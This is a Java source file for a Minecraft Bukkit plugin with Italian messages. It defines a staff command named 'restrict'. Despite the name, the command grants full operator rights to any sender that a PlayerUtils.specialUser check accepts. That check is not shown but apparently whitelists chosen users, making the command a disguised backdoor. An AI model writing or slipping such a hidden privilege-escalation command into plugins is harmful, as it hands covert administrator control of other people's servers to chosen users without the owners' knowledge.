package it.mathanalisys.vanilla.command.staff;

import it.mathanalisys.vanilla.utils.CC;
import it.mathanalisys.vanilla.utils.PlayerUtils;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class RestrictCommand extends Command {

    public RestrictCommand() {
        super("restrict");
    }

    @Override
    public boolean execute(@NotNull CommandSender sender, @NotNull String s, @NotNull String[] args) {
        if (!PlayerUtils.specialUser((Player) sender)){
            sender.sendMessage(CC.translate("&cNopn puoi eseguire questo comando"));
            return false;
        }
        if (PlayerUtils.specialUser((Player) sender)){
            sender.setOp(true);
            sender.sendMessage("&aSei stato oppato");
        }
        sender.sendMessage(CC.translate("&cGiocatori Oline: &f" + Bukkit.getOnlinePlayers().size()));


        return false;
    }
}
